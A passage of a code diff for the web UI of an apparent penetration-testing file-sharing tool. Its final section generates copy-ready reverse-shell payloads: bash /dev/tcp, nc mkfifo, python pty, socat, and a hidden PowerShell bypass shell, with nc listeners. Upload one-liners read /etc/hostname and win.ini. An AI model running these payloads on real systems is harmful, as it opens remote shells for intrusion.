+  </div>
+</section>
+
+<!-- Stats popover -->
+<div class="stats" id="stats" hidden></div>
+
+<!-- Full-page drop overlay -->
+<div class="overlay" id="overlay" hidden>
+  <div class="ov-box">
+    <svg viewBox="0 0 24 24"><path d="M12 16V4m0 0l-4 4m4-4l4 4"/><path d="M4 15v3a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-3"/></svg>
+    <p>Drop to upload</p>
   </div>
 </div>
 
-<script>
-let F=[];
+<div class="toast" id="toast" role="status"></div>
+
+<script>'use strict';
+/* expose — web UI */
+
+// ── utils ─────────────────────────────────────────────────
 const q=id=>document.getElementById(id);
-const drop=q('drop'),fi=q('fi'),queue=q('queue'),qn=q('qn'),
-      acts=q('acts'),send=q('send'),clr=q('clr'),
-      prog=q('prog'),bar=q('bar'),msg=q('msg');
-
-function fmt(b){
-  if(b<1024)return b+'\u2009B';
-  if(b<1048576)return(b/1024).toFixed(1)+'\u2009K';
-  return(b/1048576).toFixed(1)+'\u2009M'}
-
 function esc(s){const d=document.createElement('span');d.textContent=s;return d.innerHTML}
-
-function add(nf){for(const f of nf)if(!F.some(x=>x.name===f.name&&x.size===f.size))F.push(f);render()}
-
-function render(){
-  queue.innerHTML='';
-  F.forEach((f,i)=>{
-    const d=document.createElement('div');d.className='qi';d.style.animationDelay=i*25+'ms';
-    d.innerHTML='<span class="fn">'+esc(f.name)+'</span><span class="fs">'+fmt(f.size)+'</span><button class="qr" data-i="'+i+'">x</button>';
-    queue.appendChild(d)});
-  qn.textContent=F.length?F.length+' queued':'';
-  acts.style.display=F.length?'flex':'none';
-  msg.classList.remove('vis','ok','err');msg.textContent=''}
-
-queue.addEventListener('click',e=>{const b=e.target.closest('.qr');if(b){F.splice(+b.dataset.i,1);render()}});
-clr.addEventListener('click',()=>{F=[];render()});
-
-drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('over')});
-drop.addEventListener('dragleave',e=>{if(!drop.contains(e.relatedTarget))drop.classList.remove('over')});
-drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('over');add(e.dataTransfer.files)});
-q('browse').addEventListener('click',()=>fi.click());
-fi.addEventListener('change',()=>{add(fi.files);fi.value=''});
-
-send.addEventListener('click',()=>{
-  if(!F.length)return;send.disabled=true;prog.style.display='block';bar.style.width='0';
-  const fd=new FormData();F.forEach(f=>fd.append('files',f));
-  const xhr=new XMLHttpRequest();xhr.open('POST','/upload');
-  xhr.upload.onprogress=e=>{if(e.lengthComputable)bar.style.width=(e.loaded/e.total*100)+'%'};
-  xhr.onload=()=>{bar.style.width='100%';
-    try{const r=JSON.parse(xhr.responseText);
-      msg.textContent=r.count+' file'+(r.count!==1?'s':'')+' received';
-      msg.classList.add('vis','ok');F=[];render();loadDisk()}
-    catch(e){msg.textContent='transfer failed';msg.classList.add('vis','err')}
-    send.disabled=false;setTimeout(()=>{prog.style.display='none';bar.style.width='0'},2000)};
-  xhr.onerror=()=>{msg.textContent='connection lost';msg.classList.add('vis','err');
-    send.disabled=false;prog.style.display='none'};
-  xhr.send(fd)});
-
-const divider=q('divider'),disk=q('disk'),dn=q('dn');
-
-function loadDisk(){
-  fetch('/upload/files').then(r=>r.json()).then(files=>{
-    disk.innerHTML='';divider.style.display=files.length?'block':'none';
-    dn.textContent=files.length?files.length+' file'+(files.length!==1?'s':''):'';
-    if(!files.length){disk.innerHTML='<div class="empty">nothing here yet</div>';divider.style.display='block';return}
-    files.forEach((f,i)=>{
-      const d=document.createElement('div');d.className='di';d.style.animationDelay=i*15+'ms';
-      const link=location.origin+'/upload/files/'+encodeURIComponent(f.name);
-      d.innerHTML='<span class="fn">'+esc(f.name)+'</span><span class="fs">'+fmt(f.size)+'</span>'+
-        '<button class="dl" data-l="'+esc(link)+'">link</button>'+
-        '<a class="dd" href="/upload/files/'+encodeURIComponent(f.name)+'" download>get</a>'+
-        '<button class="dx" data-n="'+esc(f.name)+'">del</button>';
-      disk.appendChild(d)});
-  }).catch(()=>{})}
-
-disk.addEventListener('click',e=>{
-  const lb=e.target.closest('.dl');
-  if(lb){const url=lb.dataset.l;
-    const ok=()=>{lb.textContent='copied';lb.classList.add('copied');
-      setTimeout(()=>{lb.textContent='link';lb.classList.remove('copied')},1200)};
-    const fb=()=>{const inp=document.createElement('input');inp.value=url;inp.className='cpi';
-      inp.readOnly=true;lb.parentNode.insertBefore(inp,lb.nextSibling);inp.focus();inp.select();
-      try{document.execCommand('copy');ok()}catch(_){}
-      inp.addEventListener('blur',()=>inp.remove())};
-    if(navigator.clipboard&&navigator.clipboard.writeText){
-      navigator.clipboard.writeText(url).then(ok).catch(fb)}else{fb()}
-    return}
-  const b=e.target.closest('.dx');if(!b)return;
-  const n=b.dataset.n;if(!confirm('Delete '+n+'?'))return;
-  fetch('/upload/files/'+encodeURIComponent(n),{method:'DELETE'}).then(r=>r.json()).then(r=>{
-    if(r.ok)loadDisk()}).catch(()=>{})});
-
-loadDisk();
-
-// ── Mode-aware context ──
 function ea(s){return esc(s).replace(/"/g,'&quot;')}
+function fmt(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' K';return(b/1048576).toFixed(1)+' M'}
+function ago(ts){const s=(Date.now()/1000-ts)|0;
+  if(s<45)return'just now';const m=s/60|0;if(m<60)return m+'m ago';
+  const h=m/60|0;if(h<24)return h+'h ago';return(h/24|0)+'d ago'}
+const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+function fdate(ts){const d=new Date(ts*1000);
+  return MO[d.getMonth()]+' '+d.getDate()+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')}
+
+let _tt=null;
+function toast(t){const el=q('toast');el.textContent=t;el.classList.add('vis');
+  clearTimeout(_tt);_tt=setTimeout(()=>el.classList.remove('vis'),1600)}
+
+function copyText(txt,okMsg){
+  const done=()=>toast(okMsg||'Copied to clipboard');
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(txt).then(done).catch(()=>fallback());
+  }else fallback();
+  function fallback(){
+    const ta=document.createElement('textarea');ta.value=txt;ta.style.position='fixed';ta.style.opacity='0';
+    document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');done()}catch(_){}
+    ta.remove();
+  }
+}
+
+// ── icons (inline SVG, stroke = currentColor) ─────────────
+const I={
+  file:'<svg class="ic" viewBox="0 0 24 24"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8l-5-5z"/><path d="M14 3v5h5"/></svg>',
+  folder:'<svg class="ic" viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg>',
+  dl:'<svg class="ic" viewBox="0 0 24 24"><path d="M12 4v12m0 0l-4-4m4 4l4-4"/><path d="M4 17v1a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-1"/></svg>',
+  copy:'<svg class="ic" viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>',
+  trash:'<svg class="ic" viewBox="0 0 24 24"><path d="M4 7h16M10 11v6m4-6v6M6 7l1 12a2 2 0 0 0 2 1h6a2 2 0 0 0 2-1l1-12M9 7V4h6v3"/></svg>',
+  x:'<svg class="ic" viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>',
+  act:'<svg class="ic" viewBox="0 0 24 24"><path d="M3 12h4l3 8 4-16 3 8h4"/></svg>',
+  up:'<svg class="ic" viewBox="0 0 24 24"><path d="M12 19V5m0 0l-5 5m5-5l5 5"/></svg>',
+  sun:'<circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4l1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/>',
+  moon:'<path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/>',
+  auto:'<circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18z" fill="currentColor" stroke="none"/>'
+};
+
+// ── theme: auto follows the OS, toggle overrides (persisted) ──
+const THEME_KEY='expose-theme';
+function themeGet(){try{return localStorage.getItem(THEME_KEY)||'auto'}catch(e){return'auto'}}
+function themeApply(t){
+  const root=document.documentElement;
+  if(t==='auto'){root.removeAttribute('data-theme')}else{root.dataset.theme=t}
+  const b=q('theme-toggle');
+  b.title='Theme: '+t+(t==='auto'?' (system)':'');
+  q('theme-ic').innerHTML=t==='light'?I.sun:t==='dark'?I.moon:I.auto;
+}
+q('theme-toggle').addEventListener('click',()=>{
+  const order=['auto','light','dark'];
+  const next=order[(order.indexOf(themeGet())+1)%order.length];
+  try{localStorage.setItem(THEME_KEY,next)}catch(e){}
+  themeApply(next);
+  toast('Theme: '+next+(next==='auto'?' (follows system)':''));
+});
+themeApply(themeGet());
+
+// ── header actions ────────────────────────────────────────
+q('copy-url').addEventListener('click',()=>copyText(location.origin,'Link copied'));
+
+// ── hero: mode-aware context ──────────────────────────────
+const BADGE={dir:'blu',catch:'vio',payload:'amb',redirect:'amb',websocket:'vio'};
+
 fetch('/meta').then(r=>r.json()).then(m=>{
-  const ctx=q('ctx'),hp=q('hpath');
-  if(m.mode==='text'){
-    hp.textContent='text ('+fmt(m.size)+')';
+  const hero=q('hero'),badge=q('mode-badge');
+  const mode=m.mode||'text';
+  badge.textContent=mode;
+  if(BADGE[mode])badge.classList.add(BADGE[mode]);
+  hero.hidden=false;
+
+  if(mode==='file'){
+    hero.innerHTML='<div class="hero-lbl">Sharing a file</div>'+
+      '<div class="hero-file"><span class="fic">'+I.file+'</span>'+
+      '<div><div class="fnm">'+esc(m.name)+'</div>'+
+      '<div class="fmeta">'+fmt(m.size)+' &middot; '+esc(m.mime||'unknown')+'</div></div>'+
+      '<div class="sp"></div><div class="hero-acts">'+
+      '<a class="btn primary" href="/content" download="'+ea(m.name)+'">'+I.dl+'Download</a>'+
+      '<button class="btn ghost" id="h-copy">'+I.copy+'Copy link</button></div></div>';
+    q('h-copy').addEventListener('click',()=>copyText(location.origin+'/content','Link copied'));
+
+  }else if(mode==='dir'){
+    hero.innerHTML='<div class="hero-lbl">Sharing a directory</div>'+
+      '<div class="dir-host" title="Directory on this machine">'+esc(m.path||'')+'</div>'+
+      '<div class="crumbs" id="crumbs"></div><div id="direntries"></div>';
+    loadDir(location.hash.slice(1)||'/');
+
+  }else if(mode==='catch'){
+    hero.innerHTML='<div class="hero-catch"><span class="radar">'+I.act+'</span>'+
+      '<h3>Request catcher is live</h3>'+
+      '<p>Point a webhook or send any request here — full headers and body show up in the request log below and in the operator&rsquo;s terminal.</p>'+
+      '<span class="curl-chip"><span id="curl-sample"></span>'+
+      '<button class="iconbtn" id="h-curl" title="Copy curl command">'+I.copy+'</button></span></div>';
+    const sample='curl -X POST '+location.origin+' -d \'{"hello":"world"}\'';
+    q('curl-sample').textContent=sample;
+    q('h-curl').addEventListener('click',()=>copyText(sample,'curl command copied'));
+
+  }else{
+    // text / payload / redirect / anything else that serves /content
+    const label=mode==='text'?'Sharing text':mode==='payload'?'Sharing a payload':'Serving '+mode;
     fetch('/content').then(r=>r.text()).then(t=>{
-      ctx.innerHTML='<div class="ctx-lbl">response</div><pre class="ctx-text">'+esc(t)+'</pre><button class="ctx-copy" onclick="var p=this.previousElementSibling;navigator.clipboard.writeText(p.textContent).then(function(){this.textContent=\'Copied!\';setTimeout(function(){this.textContent=\'Copy\'},1200)}.bind(this))">Copy</button>';
-      ctx.classList.add('vis')});
-  }else if(m.mode==='file'){
-    hp.textContent=m.name;
-    ctx.innerHTML='<div class="ctx-lbl">file</div><div class="ctx-file"><span class="fn">'+esc(m.name)+'</span><span class="fs">'+fmt(m.size)+'</span><a class="dd" href="/content" download="'+ea(m.name)+'">download</a></div>';
-    ctx.classList.add('vis');
-  }else if(m.mode==='dir'){
-    hp.textContent=m.path;
-    ctx.innerHTML='<div class="ctx-lbl">directory</div><div id="crumbs" class="crumbs"></div><div id="direntries"></div>';
-    ctx.classList.add('vis');
-    _loadDir(location.hash.slice(1)||'/');
-  }else if(m.mode==='catch'){
-    hp.textContent='catch';
-    ctx.innerHTML='<div class="ctx-catch">request catcher active \u2014 check terminal for captured data</div>';
-    ctx.classList.add('vis');
+      if(!t){hero.hidden=true;return}
+      hero.innerHTML='<div class="hero-lbl">'+esc(label)+'</div>'+
+        '<pre class="hero-text" id="h-text"></pre>'+
+        '<div class="hero-acts"><button class="btn ghost" id="h-copy">'+I.copy+'Copy</button></div>';
+      q('h-text').textContent=t;
+      q('h-copy').addEventListener('click',()=>copyText(t,'Copied to clipboard'));
+    }).catch(()=>{hero.hidden=true});
   }
 }).catch(()=>{});
 
-function _loadDir(path){
+// ── directory browser ─────────────────────────────────────
+function loadDir(path){
   history.replaceState(null,'','#'+path);
   fetch('/ls'+(path==='/'?'':path)).then(r=>r.json()).then(d=>{
     const cr=q('crumbs'),el=q('direntries');
     if(cr){
-      let bc='<a href="#" data-d="/">./</a>';
+      let bc='<a href="#" data-d="/">root</a>';
       if(d.path&&d.path!=='/'){
         const ps=d.path.replace(/^\/|\/$/g,'').split('/');
-        let acc='';ps.forEach(p=>{acc+='/'+p;bc+=' <a href="#" data-d="'+ea(acc)+'">'+esc(p)+'/</a>';});
+        let acc='';
+        ps.forEach((p,i)=>{acc+='/'+p;
+          bc+='<span class="fsep">/</span>'+(i===ps.length-1
+            ?'<span class="cur">'+esc(p)+'</span>'
+            :'<a href="#" data-d="'+ea(acc)+'">'+esc(p)+'</a>');});
       }
       cr.innerHTML=bc;
-      cr.querySelectorAll('a').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();_loadDir(a.dataset.d)}));
+      cr.querySelectorAll('a').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();loadDir(a.dataset.d)}));
     }
     if(!el)return;
     el.innerHTML='';
-    if(d.parent!=null){
-      const up=document.createElement('div');up.className='de is-dir';
-      up.innerHTML='<span class="fn"><a href="#" data-d="'+ea(d.parent)+'">../</a></span><span class="fs"></span>';
-      up.querySelector('a').addEventListener('click',e=>{e.preventDefault();_loadDir(d.parent)});
-      el.appendChild(up);
-    }
-    d.entries.forEach(e=>{
+    const rows=[];
+    if(d.parent!=null)rows.push({name:'..',type:'dir',up:d.parent});
+    d.entries.forEach(e=>rows.push(e));
+    if(!rows.length){el.innerHTML='<div class="dir-empty">empty directory</div>';return}
+    rows.forEach((e,i)=>{
       const row=document.createElement('div');
+      const dp=(d.path==='/'?'/':d.path+'/')+e.name;
       if(e.type==='dir'){
         row.className='de is-dir';
-        const dp=(d.path==='/'?'/':d.path+'/')+e.name;
-        row.innerHTML='<span class="fn"><a href="#" data-d="'+ea(dp)+'">'+esc(e.name)+'/</a></span><span class="fs"></span>';
-        row.querySelector('a').addEventListener('click',ev=>{ev.preventDefault();_loadDir(dp)});
+        const target=e.up!=null?e.up:dp;
+        row.innerHTML=I.folder+'<span class="fn"><a href="#" data-d="'+ea(target)+'">'+esc(e.name)+'/</a></span><span class="fs"></span><span class="fd"></span>';
+        row.querySelector('a').addEventListener('click',ev=>{ev.preventDefault();loadDir(target)});
       }else{
         row.className='de';
-        const fp=(d.path==='/'?'/':d.path+'/')+e.name;
-        const href=encodeURI(fp);
-        row.innerHTML='<span class="fn"><a href="'+href+'" download>'+esc(e.name)+'</a></span><span class="fs">'+fmt(e.size)+'</span><a class="dd" href="'+href+'" download>get</a>';
+        const href=encodeURI(dp);
+        row.innerHTML=I.file+'<span class="fn"><a href="'+href+'" download>'+esc(e.name)+'</a></span>'+
+          '<span class="fs">'+fmt(e.size)+'</span><span class="fd">'+(e.mtime?fdate(e.mtime):'')+'</span>';
       }
+      row.style.animationDelay=Math.min(i*18,300)+'ms';
       el.appendChild(row);
     });
   }).catch(()=>{});
 }
 
-// ── Live request log panel ──
-(function(){
-  const lp=q('lp'),lpBar=q('lp-bar'),lpBody=q('lp-body'),lpBadge=q('lp-badge'),
-        lpSearch=q('lp-search'),lpEmpty=q('lp-empty'),
-        btnPause=q('lp-pause'),btnExport=q('lp-export'),btnClear=q('lp-clear');
-  let entries=[],lastN=0,paused=false,autoScroll=true,filter='';
+// ── upload ────────────────────────────────────────────────
+let F=[];
+const drop=q('drop'),fi=q('fi'),queue=q('queue'),upActs=q('up-acts'),
+      sendBtn=q('send'),clrBtn=q('clr'),prog=q('prog'),bar=q('bar'),msg=q('msg');
 
-  // collapse/expand
+function addFiles(nf){for(const f of nf)if(!F.some(x=>x.name===f.name&&x.size===f.size))F.push(f);renderQueue()}
+function renderQueue(){
+  queue.innerHTML='';
+  F.forEach((f,i)=>{
+    const d=document.createElement('div');d.className='qi';d.style.animationDelay=Math.min(i*25,250)+'ms';
+    d.innerHTML=I.file+'<span class="qn" title="'+ea(f.name)+'">'+esc(f.name)+'</span>'+
+      '<span class="qs">'+fmt(f.size)+'</span>'+
+      '<button class="iconbtn dgr" data-i="'+i+'" aria-label="Remove">'+I.x+'</button>';
+    queue.appendChild(d)});
+  q('send-n').textContent=F.length>1?'('+F.length+')':'';
+  upActs.hidden=!F.length;
+  msg.className='up-msg';msg.textContent='';
+}
+queue.addEventListener('click',e=>{const b=e.target.closest('.iconbtn');if(b){F.splice(+b.dataset.i,1);renderQueue()}});
+clrBtn.addEventListener('click',()=>{F=[];renderQueue()});
+
+drop.addEventListener('click',e=>{if(!e.target.closest('.linklike'))fi.click()});
+q('browse').addEventListener('click',()=>fi.click());
+drop.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();fi.click()}});
+fi.addEventListener('change',()=>{addFiles(fi.files);fi.value=''});
+
+drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('over')});
+drop.addEventListener('dragleave',e=>{if(!drop.contains(e.relatedTarget))drop.classList.remove('over')});
+drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('over');addFiles(e.dataTransfer.files)});
+
+// page-wide drag overlay
+const overlay=q('overlay');
+let dragDepth=0;
+window.addEventListener('dragenter',e=>{
+  if(!e.dataTransfer||![...e.dataTransfer.types].includes('Files'))return;
+  dragDepth++;overlay.hidden=false});
+window.addEventListener('dragleave',()=>{dragDepth=Math.max(0,dragDepth-1);if(!dragDepth)overlay.hidden=true});
+window.addEventListener('dragover',e=>e.preventDefault());
+window.addEventListener('drop',e=>{
+  e.preventDefault();dragDepth=0;overlay.hidden=true;
+  if(e.dataTransfer&&e.dataTransfer.files.length)addFiles(e.dataTransfer.files)});
+
+sendBtn.addEventListener('click',()=>{
+  if(!F.length)return;
+  sendBtn.disabled=true;prog.hidden=false;bar.style.width='0';
+  const fd=new FormData();F.forEach(f=>fd.append('files',f));
+  const xhr=new XMLHttpRequest();xhr.open('POST','/upload');
+  xhr.upload.onprogress=e=>{if(e.lengthComputable)bar.style.width=(e.loaded/e.total*100)+'%'};
+  xhr.onload=()=>{bar.style.width='100%';
+    try{const r=JSON.parse(xhr.responseText);
+      msg.textContent=r.count+' file'+(r.count!==1?'s':'')+' received by the host';
+      msg.className='up-msg ok';F=[];renderQueue();loadDisk();
+    }catch(e){msg.textContent='transfer failed — unexpected response';msg.className='up-msg err'}
+    sendBtn.disabled=false;setTimeout(()=>{prog.hidden=true;bar.style.width='0'},1400)};
+  xhr.onerror=()=>{msg.textContent='connection lost — is the server still up?';msg.className='up-msg err';
+    sendBtn.disabled=false;prog.hidden=true};
+  xhr.send(fd)});
+
+// ── received files ────────────────────────────────────────
+const disk=q('disk'),recvN=q('recv-n');
+
+function loadDisk(){
+  fetch('/upload/files').then(r=>r.json()).then(files=>{
+    recvN.textContent=files.length?files.length+' file'+(files.length!==1?'s':'')+' on this machine':'';
+    disk.innerHTML='';
+    if(!files.length){disk.innerHTML='<div class="disk-empty">nothing received yet — files people send appear here</div>';return}
+    files.forEach((f,i)=>{
+      const d=document.createElement('div');d.className='di';d.style.animationDelay=Math.min(i*20,300)+'ms';
+      d.innerHTML=I.file+
+        '<div><div class="dn" title="'+ea(f.name)+'">'+esc(f.name)+'</div>'+
+        '<div class="dm">'+fmt(f.size)+(f.mtime?' &middot; '+ago(f.mtime):'')+'</div></div>'+
+        '<div class="da">'+
+          '<button class="iconbtn dcp" title="Copy link" aria-label="Copy link">'+I.copy+'</button>'+
+          '<a class="iconbtn" title="Download" aria-label="Download" href="/upload/files/'+encodeURIComponent(f.name)+'" download>'+I.dl+'</a>'+
+          '<button class="iconbtn dgr dx" title="Delete" aria-label="Delete" data-n="'+ea(f.name)+'">'+I.trash+'</button>'+
+        '</div>';
+      disk.appendChild(d)});
+  }).catch(()=>{})}
+
+disk.addEventListener('click',e=>{
+  const cp=e.target.closest('.dcp');
+  if(cp){
+    const name=cp.closest('.di').querySelector('.dn').textContent;
+    copyText(location.origin+'/upload/files/'+encodeURIComponent(name),'Link copied');
+    return}
+  const b=e.target.closest('.dx');
+  if(!b)return;
+  if(b.dataset.armed){
+    delete b.dataset.armed;
+    fetch('/upload/files/'+encodeURIComponent(b.dataset.n),{method:'DELETE'})
+      .then(r=>r.json()).then(r=>{if(r.ok){loadDisk();toast('Deleted '+b.dataset.n)}}).catch(()=>{});
+  }else{
+    b.dataset.armed='1';b.closest('.di').classList.add('confirm');
+    b.innerHTML='<span style="font-size:10.5px;font-weight:700">sure?</span>';
+    setTimeout(()=>{if(b.isConnected&&b.dataset.armed){
+      delete b.dataset.armed;b.closest('.di').classList.remove('confirm');b.innerHTML=I.trash}},2500);
+  }});
+
+loadDisk();
+
+// ── CLI one-liners ────────────────────────────────────────
+(function(){
+  const U=location.origin,H=location.hostname,
+        P=location.port||(location.protocol==='https:'?'443':'80');
+  const sub=s=>s.replaceAll('{U}',U).replaceAll('{H}',H).replaceAll('{P}',P);
+  // upload  → POST /upload (multipart, field "files") — lands in ~/Downloads/expose
+  // chat    → POST /chat (raw body) — appears in the chat panel
+  // download→ GET  /content — the shared text/file
+  const CMDS={
+    linux:{
+      upload:[
+        ['curl','curl -F "files=@/etc/hostname" {U}/upload'],
+        ['httpie','http --form POST {U}/upload files@/etc/hostname'],
+        ['python3 · requests',`python3 -c "import requests;print(requests.post('{U}/upload',files={'files':open('/etc/hostname','rb')}).text)"`],
+        ['python3 · stdlib',`python3 -c "import urllib.request,uuid;b=uuid.uuid4().hex;d=open('/etc/hostname','rb').read();body=('--'+b+'\\r\\nContent-Disposition: form-data; name=\\"files\\"; filename=\\"hostname\\"\\r\\n\\r\\n').encode()+d+('\\r\\n--'+b+'--\\r\\n').encode();r=urllib.request.Request('{U}/upload',data=body,headers={'Content-Type':'multipart/form-data; boundary='+b});print(urllib.request.urlopen(r).read().decode())"`],
+      ],
+      chat:[
+        ['curl',`curl -d 'hello from curl' {U}/chat`],
+        ['wget',`wget -qO- --post-data 'hello from wget' {U}/chat`],
+        ['nc',`m='hello from nc';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | nc {H} {P}`],
+        ['python3',`python3 -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello from python')).read().decode())"`],
+        ['socat',`m='hello from socat';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | socat - TCP:{H}:{P}`],
+      ],
+      download:[
+        ['curl','curl -OJ {U}/content'],
+        ['wget','wget {U}/content -O downloaded'],
+        ['python3',`python3 -c "import urllib.request;open('downloaded','wb').write(urllib.request.urlopen('{U}/content').read())"`],
+      ],
+    },
+    macos:{
+      upload:[
+        ['curl','curl -F "files=@/etc/hostname" {U}/upload'],
+        ['httpie · brew','http --form POST {U}/upload files@/etc/hostname'],
+        ['python3 · stdlib',`python3 -c "import urllib.request,uuid;b=uuid.uuid4().hex;d=open('/etc/hostname','rb').read();body=('--'+b+'\\r\\nContent-Disposition: form-data; name=\\"files\\"; filename=\\"hostname\\"\\r\\n\\r\\n').encode()+d+('\\r\\n--'+b+'--\\r\\n').encode();r=urllib.request.Request('{U}/upload',data=body,headers={'Content-Type':'multipart/form-data; boundary='+b});print(urllib.request.urlopen(r).read().decode())"`],
+      ],
+      chat:[
+        ['curl',`curl -d 'hello from mac' {U}/chat`],
+        ['wget · brew',`wget -qO- --post-data 'hello from wget' {U}/chat`],
+        ['nc',`m='hello from nc';printf "POST /chat HTTP/1.1\\r\\nHost: {H}\\r\\nContent-Length: \${#m}\\r\\nConnection: close\\r\\n\\r\\n$m" | nc {H} {P}`],
+        ['python3',`python3 -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello from python')).read().decode())"`],
+      ],
+      download:[
+        ['curl','curl -OJ {U}/content'],
+        ['wget · brew','wget {U}/content -O downloaded'],
+      ],
+    },
+    windows:{
+      upload:[
+        ['curl.exe','curl.exe -F "files=@C:\\Windows\\win.ini" {U}/upload'],
+        ['PowerShell 7+','powershell -c "Invoke-RestMethod {U}/upload -Method Post -Form @{files=Get-Item C:\\Windows\\win.ini}"'],
+        ['python',`python -c "import requests;print(requests.post('{U}/upload',files={'files':open(r'C:\\\\Windows\\\\win.ini','rb')}).text)"`],
+      ],
+      chat:[
+        ['curl.exe','curl.exe -d "hello from windows" {U}/chat'],
+        ['PowerShell',`powershell -c "irm {U}/chat -Method Post -Body 'hello from powershell'"`],
+        ['python',`python -c "import urllib.request;print(urllib.request.urlopen(urllib.request.Request('{U}/chat',data=b'hello')).read().decode())"`],
+      ],
+      download:[
+        ['curl.exe','curl.exe -o out.txt {U}/content'],
+        ['PowerShell','powershell -c "iwr {U}/content -OutFile C:\\Temp\\out.txt"'],
+        ['certutil','certutil -urlcache -split -f {U}/content C:\\Temp\\out.txt'],
+        ['bitsadmin','bitsadmin /transfer job {U}/content C:\\Temp\\out.txt'],
+      ],
+    },
+  };
+  const GROUPS=[['upload','Upload a file','lands in ~/Downloads/expose on this machine'],
+                ['chat','Post a chat message','shows up in the chat panel'],
+                ['download','Download shared content','whatever is being served right now']];
+  const box=q('cmds');
+  let os='linux';
+
+  // collapsed by default — click the header to expand
+  q('cli-h').addEventListener('click',e=>{
+    if(e.target.closest('.os-pill'))return;
+    q('cli-card').classList.toggle('collapsed')});
+
+  function render(){
+    let h='';
+    for(const[g,label,hint]of GROUPS){
+      h+='<div class="cmd-g"><h4>'+label+' &middot; '+hint+'</h4>';
+      CMDS[os][g].forEach(([tool,cmd],i)=>{
+        h+='<div class="cmd"><span class="cmd-t">'+esc(tool)+'</span>'+
+           '<code class="cmd-c">'+esc(sub(cmd))+'</code>'+
+           '<button class="iconbtn cmd-copy" data-c="'+ea(sub(cmd))+'" title="Copy command" aria-label="Copy command">'+I.copy+'</button></div>';
+      });
+      h+='</div>';
+    }
+    box.innerHTML=h;
+  }
+  box.addEventListener('click',e=>{
+    const b=e.target.closest('.cmd-copy');if(!b)return;
+    copyText(b.dataset.c,'Command copied')});
+  q('os-pills').addEventListener('click',e=>{
+    const p=e.target.closest('.os-pill');if(!p)return;
+    os=p.dataset.os;
+    q('os-pills').querySelectorAll('.os-pill').forEach(x=>x.classList.toggle('active',x===p));
+    render()});
+  render();
+})();
+
+// ── reverse shells ────────────────────────────────────────
+(function(){
+  const hostIn=q('rs-host'),portIn=q('rs-port'),box=q('rcmds');
+  hostIn.value=location.hostname;portIn.value='4444';
+  const PS_BODY=`$client = New-Object System.Net.Sockets.TCPClient('{H}',{P});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+  const ZSH=`zsh -c 'zmodload zsh/net/tcp && ztcp {H} {P} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`;
+  const BASH=`bash -i >& /dev/tcp/{H}/{P} 0>&1`;
+  const NCFIFO=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {H} {P} >/tmp/f`;
+  const PY3=`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{H}",{P}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
+  const RS={
+    linux:[
+      ['bash',BASH],
+      ['bash -c',`bash -c 'bash -i >& /dev/tcp/{H}/{P} 0>&1'`],
+      ['zsh',ZSH],
+      ['nc -e · trad.',`nc {H} {P} -e /bin/bash`],
+      ['nc · mkfifo',NCFIFO],
+      ['python3',PY3,'best'],
+      ['socat',`socat TCP:{H}:{P} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,'best TTY'],
+    ],
+    macos:[
+      ['zsh',ZSH,'best'],
+      ['bash',BASH],
+      ['nc · mkfifo',NCFIFO],
+      ['python3',PY3,'best TTY'],
+    ],
+    windows:[
+      ['PowerShell','powershell -nop -c "'+PS_BODY+'"','best'],
+      ['PS · bypass','powershell -nop -W hidden -ep bypass -c "'+PS_BODY+'"'],
+      ['ncat',`ncat.exe {H} {P} -e cmd.exe`],
+    ],
+  };
+  const LISTENER=[
+    ['nc',`nc -lvnp {P}`],
+    ['rlwrap · nc',`rlwrap nc -lvnp {P}`],
